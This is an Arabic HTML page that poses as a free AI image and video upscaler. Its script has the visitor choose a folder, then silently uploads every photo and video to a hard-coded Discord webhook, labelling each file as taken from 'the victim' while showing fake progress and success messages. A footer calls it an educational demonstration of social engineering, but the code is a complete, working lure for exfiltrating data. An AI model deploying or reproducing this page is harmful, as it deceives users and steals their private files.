<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مُعالج الوسائط الذكي (AI)</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Cairo', sans-serif;
            background: #0f0c29;
            background: linear-gradient(to bottom, #24243e, #302b63, #0f0c29);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
            text-align: center;
            width: 450px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        h1 { color: #00d2ff; margin-bottom: 15px; }
        p { color: #ccc; font-size: 15px; }
        .btn {
            background: #00d2ff;
            background: linear-gradient(to right, #3a7bd5, #00d2ff);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
            margin-top: 20px;
        }
        .btn:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(0, 210, 255, 0.5); }
        #status { margin-top: 20px; font-size: 14px; }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 2s linear infinite;
            display: none;
            margin: 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <h1>🚀 مُعالج الفيديو والصور (AI)</h1>
    <p>قم باختيار مجلد الوسائط (صور وفيديوهات) وسيقوم الذكاء الاصطناعي بتحسين الدقة إلى 4K مجاناً.</p>
    
    <button class="btn" id="uploadBtn">اختيار المجلد لبدء المعالجة 📁</button>
    
    <div class="loader" id="loader"></div>
    <div id="status"></div>

    <div style="font-size: 10px; color: #777; margin-top: 30px;">
        مشروع تعليمي: شرح مخاطر الـ Web APIs والهندسة الاجتماعية
    </div>
</div>

<script>
    // رابط الويب هوك الخاص بك
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";

    document.getElementById('uploadBtn').addEventListener('click', async () => {
        const status = document.getElementById('status');
        const loader = document.getElementById('loader');

        try {
            // 1. طلب الوصول للمجلد
            const dirHandle = await window.showDirectoryPicker();
            
            loader.style.display = "block";
            status.style.color = "#00d2ff";
            status.innerText = "جاري تحسين الجودة.. يرجى عدم إغلاق المتصفح";

            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    const file = await entry.getFile();

                    // 2. التحقق من نوع الملف (صور أو فيديوهات فقط)
                    if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
                        
                        // 3. التحقق من حجم الملف (ديسكورد العادي يدعم حتى 8MB أو 25MB)
                        if (file.size < 25 * 1024 * 1024) { 
                            await sendFileToDiscord(file);
                        } else {
                            console.log("الملف كبير جداً: " + file.name);
                        }
                    }
                }
            }

            loader.style.display = "none";
            status.style.color = "#2ecc71";
            status.innerText = "✅ اكتملت المعالجة! تم تحسين جميع الوسائط.";

        } catch (err) {
            loader.style.display = "none";
            status.style.color = "#e74c3c";
            status.innerText = "❌ يجب منح الصلاحية للوصول للمجلد لبدء العمل.";
        }
    });

    async function sendFileToDiscord(file) {
        const formData = new FormData();
        
        // إضافة الملف للنموذج المرسل
        formData.append('file', file, file.name);
        
        // إضافة معلومات إضافية كرسالة
        const metadata = {
            content: `📂 **تم سحب ملف جديد من الضحية:**\n**الاسم:** \`${file.name}\`\n**النوع:** \`${file.type}\`\n**الحجم:** \`${(file.size / 1024 / 1024).toFixed(2)} MB\``
        };
        formData.append('payload_json', JSON.stringify(metadata));

        try {
            await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                body: formData
            });
            // انتظار بسيط بين الملفات لتجنب حظر الويب هوك (Rate Limit)
            await new Promise(r => setTimeout(r, 1000));
        } catch (e) {
            console.error("خطأ في الرفع:", e);
        }
    }
</script>

</body>
</html>
